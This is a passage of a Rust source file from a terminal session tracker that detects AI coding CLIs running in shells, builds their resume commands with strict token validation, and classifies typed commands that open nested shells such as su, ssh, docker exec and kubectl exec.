//! Session tracker: per running Shell/Custom terminal, records the live shell
//! cwd and any hand-run CLI (e.g. `claude`) so a restart can resume both.
//!
//! cwd comes from an OSC 9;9 report (freshest, see session.rs) when available,
//! else the PEB of the deepest descendant. Inner-CLI identity comes from the
//! process argv (Explicit) or timestamp correlation against session journals
//! (Correlated); genuine ambiguity is surfaced, never guessed.

use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

use uuid::Uuid;

use crate::state::{claude_project_dir_name, CliConfidence, InnerCli, NestedChain};

use super::procinfo;

pub struct TrackSample {
    pub live_cwd: Option<PathBuf>,
    pub inner_cli: Option<InnerCli>,
    /// Attribution Layer 1: the LIVE session id claude's own pid registry
    /// (`~/.claude/sessions/<pid>.json`, liveness+start gated) reports for
    /// the tracked claude descendant, when one exists. For Shell/Custom
    /// terminals it already rides `inner_cli` (Explicit); for Claude-KIND
    /// terminals — where inner_cli is never applied — it drives the live
    /// pin re-target in `apply_track_sample` (an in-TUI `/clear` or
    /// `/resume` switch updates the file within ~100ms on claude ≥2.1.200,
    /// so the pinned id follows the conversation the user actually sees).
    pub claude_live: Option<Uuid>,
}

/// How a descendant process is recognized as a CLI adapter. argv is read before
/// matching so runtime carriers (node/bun/python running an npm/py CLI) resolve
/// to the real tool name rather than the interpreter.
enum Match {
    /// Match by executable stem, e.g. ["codex"].
    ExeStem(&'static [&'static str]),
    /// A runtime (node/bun/python) whose argv names the tool.
    RuntimeArgv {
        runtimes: &'static [&'static str],
        needle: &'static str,
    },
    /// Either an exe-stem match or a runtime+argv match.
    Either {
        stems: &'static [&'static str],
        runtimes: &'static [&'static str],
        needle: &'static str,
    },
}

impl Match {
    fn matches(&self, stem: &str, argv: &[String]) -> bool {
        match self {
            Match::ExeStem(stems) => stems.contains(&stem),
            Match::RuntimeArgv { runtimes, needle } => {
                runtimes.contains(&stem) && argv_names_tool(argv, needle)
            }
            Match::Either {
                stems,
                runtimes,
                needle,
            } => stems.contains(&stem) || (runtimes.contains(&stem) && argv_names_tool(argv, needle)),
        }
    }
}

/// Adapter token extraction: (argv, cwd, process start FILETIME) →
/// (resume token, confidence).
type ExtractFn = fn(&[String], &Path, Option<u64>) -> (Option<String>, CliConfidence);

struct Adapter {
    key: &'static str,
    matcher: Match,
    /// Compiled in but skipped unless enabled — flagged adapters ship off.
    enabled: bool,
    extract: ExtractFn,
    /// Trailing resume command for a restore; None → cannot resume.
    restore: fn(Option<&str>) -> Option<String>,
}

/// Birth-correlation window: a store file (session jsonl / rollout) born
/// within this of the process start belongs to that process. Wide enough for
/// a CLI's slow first write on a loaded machine, narrow enough that an older
/// parallel session in the same cwd stays outside it.
const BIRTH_WINDOW: Duration = Duration::from_secs(30);

/// Mtime-newest tie-breaker floor: two candidates written within this of
/// each other are both plausibly live (parallel sessions in one cwd) —
/// newest-wins must abstain rather than guess.
const MTIME_TIE_GAP: Duration = Duration::from_secs(5);

const NODE_RT: &[&str] = &["node"];
const NODE_BUN_RT: &[&str] = &["node", "bun"];
const PY_RT: &[&str] = &["python", "python3"];

const ADAPTERS: &[Adapter] = &[
    // ── Claude: pinned-id path, unchanged. ──
    Adapter {
        key: "claude",
        matcher: Match::ExeStem(&["claude"]),
        enabled: true,
        extract: claude_extract,
        restore: |t| t.map(|t| format!("claude --resume {t}")),
    },
    // ── Enabled, exact-id verified. ──
    Adapter {
        key: "codex",
        matcher: Match::ExeStem(&["codex"]),
        enabled: true,
        extract: codex_extract,
        restore: |t| t.map(|t| format!("codex resume {t}")),
    },
    Adapter {
        key: "copilot",
        matcher: Match::Either { stems: &["copilot"], runtimes: NODE_RT, needle: "copilot" },
        enabled: true,
        extract: copilot_extract,
        restore: |t| t.map(|t| format!("copilot --resume {t}")),
    },
    Adapter {
        key: "qwen",
        matcher: Match::Either { stems: &["qwen"], runtimes: NODE_RT, needle: "qwen" },
        enabled: true,
        extract: qwen_extract,
        restore: |t| t.map(|t| format!("qwen --resume {t}")),
    },
    Adapter {
        key: "goose",
        matcher: Match::ExeStem(&["goose"]),
        enabled: true,
        extract: goose_extract,
        restore: |t| t.map(|t| format!("goose session --resume --session-id {t}")),
    },
    Adapter {
        key: "opencode",
        matcher: Match::Either { stems: &["opencode"], runtimes: NODE_BUN_RT, needle: "opencode" },
        enabled: true,
        extract: opencode_extract,
        restore: |t| t.map(|t| format!("opencode --session {t}")),
    },
    Adapter {
        key: "crush",
        matcher: Match::ExeStem(&["crush"]),
        enabled: true,
        extract: crush_extract,
        restore: |t| t.map(|t| format!("crush --session {t}")),
    },
    // ── Shipped OFF by default (unverified storage / correlation). ──
    Adapter {
        key: "devin",
        matcher: Match::ExeStem(&["devin"]),
        enabled: false,
        extract: devin_extract,
        restore: |t| Some(t.map(|t| format!("devin -r {t}")).unwrap_or_else(|| "devin -c".into())),
    },
    Adapter {
        key: "cursor",
        matcher: Match::ExeStem(&["cursor-agent", "agent"]),
        enabled: false,
        extract: cursor_extract,
        restore: |t| t.map(|t| format!("cursor-agent --resume {t}")),
    },
    Adapter {
        key: "amp",
        matcher: Match::Either { stems: &["amp"], runtimes: NODE_RT, needle: "amp" },
        enabled: false,
        extract: amp_extract,
        restore: |t| t.map(|t| format!("amp threads continue {t}")),
    },
    Adapter {
        key: "cline",
        matcher: Match::Either { stems: &["cline"], runtimes: NODE_RT, needle: "cline" },
        enabled: false,
        extract: cline_extract,
        restore: |t| t.map(|t| format!("cline --id {t}")),
    },
    Adapter {
        key: "gemini",
        // Real name only shows up in argv (node carrier).
        matcher: Match::RuntimeArgv { runtimes: NODE_RT, needle: "gemini" },
        enabled: false,
        extract: gemini_extract,
        restore: |_| Some("gemini --resume".into()),
    },
    Adapter {
        key: "aider",
        matcher: Match::Either { stems: &["aider"], runtimes: PY_RT, needle: "aider" },
        enabled: false,
        extract: aider_extract,
        restore: |_| Some("aider --restore-chat-history".into()),
    },
    // NOTE: no adapter for Amazon Q / Kiro — they run under WSL and are invisible
    // to this Win32 process tracker.
];

/// Resume command for an adapter, by key (used by the daemon's restore path).
/// None if the adapter is unknown or cannot resume with the given token.
pub fn restore_trailing(adapter_key: &str, token: Option<&str>) -> Option<String> {
    // Final gate for the injection class (r3-S1): the token is spliced
    // UNQUOTED into a shell command line (bash rc trailings, `cmd /K`, pwsh
    // -Command) — the trailings' `'`-refusal guards only their exec-hook
    // JSON quoting, NOT the token. Tokens reach here from argv capture
    // (already charset-validated in `flag_token`), from UUID-validated
    // remote stores, or from state.json (the hostile-config threat model) —
    // re-validate at the one choke point every restore path shares.
    if token.is_some_and(|t| !safe_resume_token(t)) {
        log::warn!("restore_trailing({adapter_key}): unsafe resume token refused");
        return None;
    }
    ADAPTERS
        .iter()
        .find(|a| a.key == adapter_key)
        .and_then(|a| (a.restore)(token))
}

/// r3-S1: the ONLY shape a resume token may have anywhere in the system. It
/// is spliced UNQUOTED into restore command lines executed by bash, cmd.exe
/// AND PowerShell (quoting is not portable across the three), so the charset
/// must contain no byte any of them treats as syntax: `[A-Za-z0-9._:@-]`,
/// no leading `-` (flag smuggling), bounded length. Every real token shape —
/// UUIDs, amp `T-…` thread ids, goose timestamped names, codex rollout stems
/// — fits comfortably.
pub(crate) fn safe_resume_token(t: &str) -> bool {
    !t.is_empty()
        && t.len() <= 128
        && !t.starts_with('-')
        && t.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b':' | b'@' | b'-'))
}

fn exe_stem(exe: &str) -> String {
    Path::new(exe)
        .file_stem()
        .map(|s| s.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default()
}

/// True if any argv element (after the runtime) names `needle`: a path component
/// whose stem equals `needle` or begins with `needle-` (so
/// "@scope/gemini-cli/dist/index.js" and ".bin/gemini" both match "gemini",
/// while "examples/…" does not match "amp").
fn argv_names_tool(argv: &[String], needle: &str) -> bool {
    argv.iter().skip(1).any(|arg| {
        arg.to_ascii_lowercase().split(['/', '\\']).any(|comp| {
            let stem = comp.split('.').next().unwrap_or(comp);
            stem == needle || stem.starts_with(&format!("{needle}-")) || comp == needle
        })
    })
}

/// Value after `flag` (space form) or `flag=value` form, for any of `flags`.
fn argv_flag_value(argv: &[String], flags: &[&str]) -> Option<String> {
    for (i, a) in argv.iter().enumerate() {
        for f in flags {
            if a == f {
                if let Some(v) = argv.get(i + 1) {
                    return Some(v.trim_matches('"').to_string());
                }
            }
            if let Some(v) = a.strip_prefix(&format!("{f}=")) {
                return Some(v.trim_matches('"').to_string());
            }
        }
    }
    None
}

/// Element immediately following a consecutive subcommand sequence, e.g. `resume`
/// in `codex resume <id>` or `threads continue` in amp.
fn argv_after_subcommand(argv: &[String], seq: &[&str]) -> Option<String> {
    argv.windows(seq.len())
        .position(|w| w.iter().zip(seq).all(|(a, b)| a == b))
        .and_then(|pos| argv.get(pos + seq.len()).cloned())
        .map(|s| s.trim_matches('"').to_string())
}

/// Inspect a running session's process tree using a shared process-table
/// snapshot. `osc_cwd` is the freshest cwd from the OSC scanner, if any.
pub fn analyze(
    table: &[(u32, u32, String)],
    root_pid: u32,
    osc_cwd: Option<PathBuf>,
) -> TrackSample {
    let descendants = procinfo::descendants_of(table, root_pid);

    // Live cwd: OSC report wins; else the deepest descendant with a readable
    // PEB cwd (a hand-run tool inherits the shell's location); else the shell.
    let mut live_cwd = osc_cwd;
    if live_cwd.is_none() {
        for e in descendants.iter().rev() {
            if let Some(c) = procinfo::read_process_cwd(e.pid) {
                live_cwd = Some(c);
                break;
            }
        }
    }
    if live_cwd.is_none() {
        live_cwd = procinfo::read_process_cwd(root_pid);
    }

    // Inner CLI: the first of ROOT + descendants that matches an enabled
    // adapter. The root is included because a Claude-KIND terminal's claude
    // process IS the ConPTY root (spawned directly, no shell) — excluding it
    // would blind the Layer-1 registry read exactly where the pin lives; for
    // Shell terminals the root is the shell and matches nothing. argv is
    // read per-process (before matching) so runtime carriers resolve
    // correctly.
    let mut inner_cli = None;
    let mut claude_live = None;
    let root_entry = table
        .iter()
        .find(|(pid, _, _)| *pid == root_pid)
        .map(|(pid, _, exe)| procinfo::ProcEntry {
            pid: *pid,
            exe: exe.clone(),
        });
    'outer: for e in root_entry.iter().chain(descendants.iter()) {
        let stem = exe_stem(&e.exe);
        let argv = procinfo::read_process_cmdline(e.pid).unwrap_or_default();
        for adapter in ADAPTERS {
            if !adapter.enabled {
                continue;
            }
            if adapter.matcher.matches(&stem, &argv) {
                let cwd = procinfo::read_process_cwd(e.pid)
                    .or_else(|| live_cwd.clone())
                    .unwrap_or_default();
                let start = procinfo::process_start_filetime(e.pid);
                // Attribution Layer 1 first: for a live claude descendant,
                // the pid registry (claude's own self-report, liveness+start
                // gated) outranks BOTH the argv and the birth/mtime
                // correlation — argv lies after an in-TUI /resume switch (it
                // keeps the stale --session-id), and the registry follows
                // /clear and /resume within ~100ms on ≥2.1.200. It is also
                // ONE file read, where the extract's correlation lists and
                // stats every jsonl under ~/.claude/projects/<munge>/ per
                // 300ms tick — so the extract runs only when the registry
                // abstains (absent/stale/older claude); its verdict then
                // stands exactly as before.
                let registry_sid = (adapter.key == "claude")
                    .then(|| {
                        super::claude_registry::local_sessions_dir().and_then(|d| {
                            super::claude_registry::live_session_for_pid(&d, e.pid, start)
                        })
                    })
                    .flatten();
                // env-prefix-cli: the registry branch is claude's OWN
                // report of the session it is in; the extract branch reads
                // argv (or correlates). That difference is the whole
                // provenance distinction — record it, do not re-derive it.
                let self_reported = registry_sid.is_some();
                let (token, confidence) = match registry_sid {
                    Some(sid) => {
                        claude_live = Some(sid);
                        (Some(sid.to_string()), CliConfidence::Explicit)
                    }
                    None => (adapter.extract)(&argv, &cwd, start),
                };
                inner_cli = Some(InnerCli {
                    adapter: adapter.key.to_string(),
                    resume_token: token,
                    confidence,
                    cwd,
                    nested: false,
                    token_self_reported: self_reported,
                });
                break 'outer;
            }
        }
    }

    TrackSample {
        live_cwd,
        inner_cli,
        claude_live,
    }
}

/// argv[0] stem for a TEXT command line: last path component, `.exe`
/// dropped, lowercased — so "/usr/local/bin/claude", "claude" and
/// "C:\\tools\\bash.exe" all name what they run. Shared by every text-path
/// classifier in this file (`analyze_cmdline`, `strip_env_prefix`,
/// `nested_shell_argv`, `crosses_to_posix`) so they can never drift on what
/// a command word names.
fn cmd_stem(word: &str) -> String {
    word.rsplit(['/', '\\'])
        .next()
        .map(|c| c.strip_suffix(".exe").unwrap_or(c).to_ascii_lowercase())
        .unwrap_or_default()
}

/// env-prefix-cli: is this token a POSIX ENVIRONMENT ASSIGNMENT —
/// `NAME=VALUE` with NAME matching `[A-Za-z_][A-Za-z0-9_]*`? The VALUE half
/// is deliberately unconstrained: `split_cmdline` has already un-quoted it,
/// so `FOO="a b"` and `FOO='a b'` both arrive as the single token `FOO=a b`
/// and are recognised exactly like `FOO=1`.
fn is_env_assignment(tok: &str) -> bool {
    let Some((name, _)) = tok.split_once('=') else {
        return false;
    };
    let mut cs = name.chars();
    cs.next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && cs.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// env-prefix-cli: the argv slice starting at the COMMAND WORD, with a
/// leading POSIX environment prefix skipped — zero or more `NAME=VALUE`
/// assignments, and/or an `env` wrapper carrying them.
///
/// The field bug this exists for: `IS_SANDBOX=1 claude
/// --dangerously-skip-permissions`, typed inside a hooked nested shell over
/// ssh. The PROCESS path never sees the assignment (a shell consumes it
/// before exec, so the OS argv already starts at `claude`); this TEXT path
/// does, and stemming argv[0] = `IS_SANDBOX=1` matched no adapter at all
/// — so the CLI was never attributed, and everything keyed off attribution
/// (the strip's CLI lane, the composer's keyboard ownership, the nested
/// breadcrumb) fell back to plain-shell behaviour.
///
/// Concrete witness only, never a guess — the same rule
/// `analyze_cmdline_with_cd` states:
///   - a prefix with NO command after it (`FOO=1`, `env`, `env FOO=1`) is a
///     launch of nothing ⇒ None;
///   - `env`'s flags are gated by an ALLOW-list (`-i` / `-` /
///     `--ignore-environment`; `-u NAME` / `-uNAME` / `--unset NAME` /
///     `--unset=NAME`; and `--`, which ends option parsing). ANY other flag
///     ⇒ None, because the ones that exist change what actually runs:
///     `-S` / `--split-string` re-tokenises the rest of the line, `-C` /
///     `--chdir` moves the directory we would report as the CLI's cwd. Same
///     degrade-rather-than-guess discipline the `sudo` / `ssh` / container
///     classifiers below apply to their own unrecognised flags.
///
/// Deliberately NOT covered, and out of scope until one shows up in the
/// field with a witness: `nohup`, `time`, `command`, `stdbuf`, `xargs`,
/// `nice`, `setsid`. Each needs its own flag table to know where its own
/// arguments stop and the command begins (`nice -n 5 cmd`, `stdbuf -oL
/// cmd`, `xargs -I{} cmd`), `time` is a bash KEYWORD whose grammar is not
/// argv at all, and one unmodelled value-flag would read the wrong token as
/// the command — which is precisely the false attribution this function
/// exists to refuse.
fn strip_env_prefix<S: AsRef<str>>(argv: &[S]) -> Option<&[S]> {
    let mut rest = argv;
    loop {
        // Leading `NAME=VALUE` assignments.
        while rest.first().is_some_and(|t| is_env_assignment(t.as_ref())) {
            rest = &rest[1..];
        }
        // ...then at most one `env` wrapper per round (`env` is itself a
        // command, so `FOO=1 env BAR=2 claude` is a legal round trip).
        if rest.first().is_none_or(|t| cmd_stem(t.as_ref()) != "env") {
            break;
        }
        rest = &rest[1..];
        while let Some(a) = rest.first().map(|t| t.as_ref()) {
            match a {
                "-" | "-i" | "--ignore-environment" => rest = &rest[1..],
                // Value-consuming: the NAME must actually be there.
                "-u" | "--unset" => {
                    rest.get(1)?;
                    rest = &rest[2..];
                }
                "--" => {
                    rest = &rest[1..];
                    break;
                }
                _ if a.starts_with("--unset=") => rest = &rest[1..],
                _ if a.starts_with("-u") && a.len() > 2 => rest = &rest[1..],
                // -S/--split-string, -C/--chdir, -0/--null, --debug,
                // --block-signals, --version, ... : ungateable ⇒ refuse.
                _ if a.starts_with('-') => return None,
                // An assignment or the command word: flags are done.
                _ => break,
            }
        }
    }
    (!rest.is_empty()).then_some(rest)
}

/// Hook-based inner-CLI detection for shells whose process trees are
/// invisible to the Win32 tracker (WSL in P6a; ssh in P6c): the exec hook's
/// command line IS the argv the adapters were built to parse. `cwd` is the
/// last hook-reported cwd (POSIX, verbatim).
///
/// D11 (remote-cli-resume-spec): every caller of this function analyzes a
/// REMOTE/hook-fed world (Ssh, WslShell), but the adapter `extract` fns'
/// correlation branches read the LOCAL filesystem (`claude_extract` walks
/// the LOCAL ~/.claude/projects/<munge(cwd)>). A local dir that happens to
/// munge like a remote posix cwd would mint a WRONG token with Correlated
/// confidence — so the verdict is SANITIZED here: only argv-Explicit tokens
/// survive; everything else degrades to token-less Ambiguous (the remote
/// correlate leg / a future \\wsl$ leg supplies real evidence later).
pub fn analyze_cmdline(cmd: &str, cwd: &Path) -> Option<InnerCli> {
    let words = split_cmdline(cmd);
    // env-prefix-cli: skip a leading environment prefix (`IS_SANDBOX=1 ...`,
    // `env FOO=1 ...`) so classification AND extraction both start at the
    // command word — the adapters' argv readers are written for an argv
    // whose head IS the tool (`argv_names_tool` skips argv[0];
    // `argv_flag_value` scans every element).
    let argv = strip_env_prefix(&words)?;
    let stem = cmd_stem(argv.first()?);
    for adapter in ADAPTERS {
        if !adapter.enabled {
            continue;
        }
        if adapter.matcher.matches(&stem, argv) {
            let (token, confidence) = (adapter.extract)(argv, cwd, None);
            // D11 sanitize: Explicit-or-nothing out of a remote analysis.
            let (token, confidence) = match confidence {
                CliConfidence::Explicit => (token, confidence),
                _ => (None, CliConfidence::Ambiguous),
            };
            return Some(InnerCli {
                adapter: adapter.key.to_string(),
                resume_token: token,
                confidence,
                cwd: cwd.to_path_buf(),
                nested: false,
                // env-prefix-cli: this path reads ARGV. Whatever the D11
                // sanitize leaves standing, the tool never spoke here.
                token_self_reported: false,
            });
        }
    }
    None
}

/// nested-shell-hooks: `analyze_cmdline` for the ONE compound shape Pulse
/// itself types and users copy from its own preface — `cd '<dir>' && <cli>
/// --resume <sid>` (`bootstrap::ssh_restore_trailing`,
/// `tracker::nested_resume_step`). The plain classifier reads argv[0] (`cd`)
/// and returns None, so the resume Pulse just typed produced a block but no
/// identity — and the breadcrumb it needs for the NEXT reconnect went
/// missing exactly where it was supposed to be re-witnessed.
///
/// Concrete-witness only, never a guess: the tail is analyzed by the SAME
/// adapter classifier, and the `cd` target replaces the reported cwd only
/// when it is an ABSOLUTE literal in the line (a relative or expanded one
/// keeps the shell's own hook-reported cwd). A `;`-chain is deliberately NOT
/// split — `&&` is the shape whose tail is guaranteed to have run.
pub fn analyze_cmdline_with_cd(cmd: &str, cwd: &Path) -> Option<InnerCli> {
    if let Some(cli) = analyze_cmdline(cmd, cwd) {
        return Some(cli);
    }
    let (target, tail) = cd_head_tail(cmd)?;
    let target = target.trim_matches(|c| c == '\'' || c == '"');
    let dir = if target.starts_with('/') {
        Path::new(target).to_path_buf()
    } else {
        cwd.to_path_buf()
    };
    let mut cli = analyze_cmdline(tail, &dir)?;
    cli.cwd = dir;
    Some(cli)
}

/// The `cd '<dir>' && <rest>` split, shared by `analyze_cmdline_with_cd` and
/// `witnessed_launch_line`: the replay normaliser must recognise EXACTLY the
/// head the classifier does, or a replayed step would re-record its own `cd`
/// and grow one more `cd '<dir>' &&` per reconnect. Returns the raw,
/// still-quoted cd target and the trimmed tail. `cd a b` is not a cd we
/// understand; a `;`-chain is deliberately NOT split — `&&` is the shape
/// whose tail is guaranteed to have run.
fn cd_head_tail(cmd: &str) -> Option<(&str, &str)> {
    let (head, tail) = cmd.split_once("&&")?;
    let mut hw = head.split_whitespace();
    if hw.next()? != "cd" {
        return None;
    }
    let target = hw.next().unwrap_or_default();
    if hw.next().is_some() {
        return None;
    }
    Some((target, tail.trim()))
}

/// Bug D / F1: does this command spawn a NESTED INTERACTIVE SHELL? The
/// integration is process-local to the login shell (delivered via one-shot
/// rcfile), so `sudo su` / `su` / a plain nested `bash` produce NO hook
/// events for anything typed inside them. Moved here from `gui::composer`
/// (still re-exported there) because the daemon now uses the SAME verdict to
/// start the F1 nested-chain breadcrumb in `track_hook_exec` — one
/// classifier, zero drift between the composer's honesty lane and the
/// breadcrumb. Pure and conservative by design: a false negative degrades to
/// today's behavior (Busy row / no breadcrumb), a false positive still
/// records a true statement.
///
/// typed-ssh-nested (v0.1.15) promotes the v2 candidates the doc parked:
/// a TYPED remote/container shell — `ssh <dest>`, `wsl`, `docker|podman exec
/// -it … <shell>`, `kubectl exec -it … -- <shell>`, `distrobox|toolbox
/// enter` — is an interactive nested shell exactly like `sudo su`, and the
/// world behind it is POSIX, so the same hook body works there. Each arm
/// uses the same value-consuming-flag discipline as `sudo`, with one
/// difference that matters: for these openers an UNRECOGNISED flag degrades
/// to FALSE rather than being skipped, because their flag surfaces are much
/// larger than sudo's and a wrong skip could turn a finite command into a
/// false "interactive shell" verdict.
pub fn nested_shell_cmd(cmd: &str) -> bool {
    let owned = split_ws_quoted(cmd);
    let argv: Vec<&str> = owned.iter().map(String::as_str).collect();
    nested_shell_argv(&argv)
}

/// Tokenise a typed command line for the nested-shell classifiers:
/// whitespace separates words, **except inside a double-quoted run**, and the
/// quote characters themselves are dropped.
///
/// Field bug (second user): his opener is
/// `ssh -i "C:\…\hosting.pem" ubuntu@52.201.138.138`. Tokenised with
/// `split_whitespace` — which both classifiers used — the quoted key path
/// shatters into three words, so `ssh_interactive_login` consumed `"C:\tc`
/// as `-i`'s value, read `probe` as the destination, saw tokens after it,
/// and returned false. A perfectly ordinary opener was therefore never
/// classified as a nested shell at all: no breadcrumb, no hook injection, no
/// recovery. Any flag value containing a space hit this — `-i`, `-F`, `-o`,
/// and `wsl --cd "C:\my dir"` alike.
///
/// Deliberately NOT a full shell splitter. `split_cmdline` eats backslashes,
/// which would destroy the Windows-path stems this classifier reads
/// (`C:\Windows\System32\OpenSSH\ssh.exe`); the whole value of this one is
/// that it touches nothing but quotes. An unbalanced quote degrades to
/// "rest of the line is one token", which is conservative in the same
/// direction as everything else here.
///
/// As a free consequence the `split_whitespace` caveat documented on
/// `nested_shell_argv` is gone too: `FOO="a b" sudo su` now strips its env
/// prefix correctly instead of failing closed.
fn split_ws_quoted(cmd: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_quote = false;
    let mut started = false;
    for ch in cmd.chars() {
        match ch {
            '"' => {
                in_quote = !in_quote;
                started = true; // `""` is a real (empty) argument
            }
            c if c.is_whitespace() && !in_quote => {
                if started {
                    out.push(std::mem::take(&mut cur));
                    started = false;
                }
            }
            c => {
                cur.push(c);
                started = true;
            }
        }
    }
    if started {
        out.push(cur);
    }
    out
}

fn nested_shell_argv(argv: &[&str]) -> bool {
    // env-prefix-cli: `IS_SANDBOX=1 sudo su` opens the same nested shell as
    // `sudo su`, and this verdict gates the hook injection the CLI
    // attribution then depends on — the two classifiers must not disagree
    // about where a command line's command word is. An ungateable `env` flag
    // degrades to FALSE here, the same conservative direction every
    // unrecognised opener flag already takes.
    //
    // Caveat by construction: callers tokenise with `split_whitespace`
    // (`nested_shell_cmd`), which is quote-blind, so a QUOTED assignment
    // value (`FOO="a b" sudo su`) splits mid-value and the leftover word
    // ends the prefix — verdict false, i.e. exactly today's behaviour.
    // Switching this lane to `split_cmdline` would fix that and break more
    // than it fixes: that splitter eats backslashes, which would destroy the
    // Windows-path stems (`C:\\...\\bash.exe`) this classifier reads.
    let argv = strip_env_prefix(argv).unwrap_or_default();
    let Some(first) = argv.first() else {
        return false;
    };
    let stem = cmd_stem(first);
    match stem.as_str() {
        // su/login: non-flag operands are USERNAMES (`su - root`) — still an
        // interactive shell; only an explicit -c command makes it finite.
        "su" | "login" => !argv[1..]
            .iter()
            .any(|a| *a == "-c" || a.starts_with("--command")),
        // Shells: interactive unless a -c command or a script/stdin operand
        // follows (`bash -l` yes; `bash -c …` / `bash script.sh` / `bash -`
        // no). A flag-value miss (`bash --rcfile x`) reads x as an operand
        // and returns false — conservative, degrades to the Busy row.
        "bash" | "zsh" | "sh" | "dash" | "fish" | "ksh" => !argv[1..]
            .iter()
            .any(|a| *a == "-c" || *a == "-" || !a.starts_with('-')),
        // sudo: -i/-s mean "give me a shell" outright; otherwise skip sudo's
        // own flags (value-consuming ones eat their operand) and classify
        // the wrapped command. Bare `sudo` prints usage — false.
        "sudo" => {
            let mut i = 1;
            while i < argv.len() {
                match argv[i] {
                    "-i" | "--login" | "-s" | "--shell" => return true,
                    // Value-consuming short flags (sudo 1.9 table).
                    "-u" | "-g" | "-U" | "-h" | "-p" | "-C" | "-D" | "-R" | "-T" | "-r"
                    | "-t" | "-B" => i += 2,
                    "--" => return nested_shell_argv(&argv[i + 1..]),
                    a if a.starts_with('-') => i += 1, // -E, -H, -n, --user=x, -uroot
                    _ => return nested_shell_argv(&argv[i..]),
                }
            }
            false
        }
        // typed-ssh-nested. The grammar lives in `state` next to
        // `ssh_destination`/`wsl_family` — the classifiers that decide the
        // same question for a PROGRAM-LEVEL terminal — so a typed opener and
        // a terminal spawned with the same argv can never disagree.
        "ssh" => crate::state::ssh_interactive_login(&argv[1..]),
        "wsl" => crate::state::wsl_interactive_shell(&argv[1..]),
        "docker" | "podman" => container_exec_shell(&argv[1..]),
        "kubectl" | "oc" => kubectl_exec_shell(&argv[1..]),
        "distrobox" | "toolbox" => box_enter(&argv[1..]),
        _ => false,
    }
}

/// typed-ssh-nested: `docker exec -it <container> <shell>` (and the
/// byte-identical `podman exec`). TRUE only for the fully interactive shape:
///
///   - the subcommand must be `exec` (`docker run -it …` is deliberately NOT
///     covered — `run`'s flag surface is an order of magnitude larger and a
///     single unmodelled value-flag would misread the image name as a
///     command);
///   - BOTH a tty and stdin must be requested (`-it`, `-ti`, `-i -t`,
///     `--interactive --tty`) — without them there is no shell to hook;
///   - `exec`'s own value-taking flags are consumed (`-e/--env`,
///     `-u/--user`, `-w/--workdir`, `--detach-keys`, `--env-file`);
///   - an UNRECOGNISED flag ⇒ false;
///   - the first bare operand is the container, and the REST must itself
///     classify as a nested shell through this very function (so
///     `docker exec -it c bash` is true and `docker exec -it c ls` is not).
fn container_exec_shell(args: &[&str]) -> bool {
    let Some((sub, mut rest)) = args.split_first() else {
        return false;
    };
    if *sub != "exec" {
        return false;
    }
    let (mut tty, mut interactive) = (false, false);
    while let Some((a, tail)) = rest.split_first() {
        let Some(flags) = a.strip_prefix('-') else {
            // Container id/name, then the command it runs.
            return tty && interactive && !tail.is_empty() && nested_shell_argv(tail);
        };
        rest = tail;
        if let Some(long) = flags.strip_prefix('-') {
            match long {
                "tty" => tty = true,
                "interactive" => interactive = true,
                "privileged" => {}
                // Detached ⇒ no terminal for us to hook.
                "detach" => return false,
                "env" | "user" | "workdir" | "detach-keys" | "env-file" => {
                    let Some((_, tail)) = rest.split_first() else {
                        return false; // flag-value miss
                    };
                    rest = tail;
                }
                // `--user=root` and friends carry their own value; anything
                // else is a flag we do not model.
                l if l.split_once('=').is_some_and(|(k, _)| {
                    matches!(k, "env" | "user" | "workdir" | "detach-keys" | "env-file")
                }) => {}
                _ => return false,
            }
            continue;
        }
        // Short cluster: `-it`, `-ti`, `-u root`, `-uroot`.
        let mut cur = flags;
        while let Some(c) = cur.chars().next() {
            cur = &cur[c.len_utf8()..];
            match c {
                't' => tty = true,
                'i' => interactive = true,
                'd' => return false, // detached ⇒ no terminal to hook
                'e' | 'u' | 'w' => {
                    if cur.is_empty() {
                        let Some((_, tail)) = rest.split_first() else {
                            return false; // flag-value miss
                        };
                        rest = tail;
                    }
                    cur = "";
                }
                _ => return false,
            }
        }
    }
    false // no container operand
}

/// typed-ssh-nested: `kubectl exec -it <pod> [-n ns] [-c ctr] -- <shell>`
/// (and OpenShift's `oc`, whose exec grammar is kubectl's). Only the
/// `--`-separated form is accepted: `--` is where kubectl's own flags
/// provably stop and the remote command provably starts, so nothing before
/// it has to be modelled at all — the conservative reading of a very large
/// flag surface. The deprecated `kubectl exec -it pod bash` (no `--`) is
/// FALSE by design.
fn kubectl_exec_shell(args: &[&str]) -> bool {
    let Some((sub, rest)) = args.split_first() else {
        return false;
    };
    if *sub != "exec" {
        return false;
    }
    let Some(sep) = rest.iter().position(|a| *a == "--") else {
        return false;
    };
    let (head, tail) = rest.split_at(sep);
    let tail = &tail[1..];
    let tty = head.iter().any(|a| {
        *a == "--tty" || (a.starts_with('-') && !a.starts_with("--") && a.contains('t'))
    });
    let stdin = head.iter().any(|a| {
        *a == "--stdin" || (a.starts_with('-') && !a.starts_with("--") && a.contains('i'))
    });
    tty && stdin && !tail.is_empty() && nested_shell_argv(tail)
}

/// typed-ssh-nested: `distrobox enter [name]` / `toolbox enter [name]` — the
/// subcommand whose WHOLE purpose is an interactive shell in the box (the
/// finite form is `distrobox enter … -- <cmd>` / `toolbox run <cmd>`). A
/// trailing bare operand is the BOX NAME, exactly as it is a username for
/// `su`, so it does not disqualify; a `--` separator or an explicit
/// `-e/--extra`-style command operand does.
fn box_enter(args: &[&str]) -> bool {
    let Some((sub, rest)) = args.split_first() else {
        return false;
    };
    *sub == "enter"
        && !rest
            .iter()
            .any(|a| *a == "--" || *a == "-e" || a.starts_with("--exec") || a.starts_with("-e="))
}

/// typed-ssh-nested: does this nested-shell opener CROSS INTO A POSIX WORLD
/// Pulse can hook — a remote host, a WSL distro, a container?
///
/// This is the one thing that distinguishes the new openers from the old
/// ones, and it is what lets the injection arm on a terminal whose OWN
/// family is pwsh/cmd: the hook body is bash/zsh, so what has to be POSIX is
/// the world the opener lands in, not the shell that typed it. `sudo su` /
/// `bash` typed in a pwsh terminal stay excluded — there the target world is
/// whatever `bash.exe` happens to be on PATH, which Pulse never set up.
///
/// Callers must still check `nested_shell_cmd` — this only names the family
/// of opener, never that the argv is interactive.
pub fn crosses_to_posix(cmd: &str) -> bool {
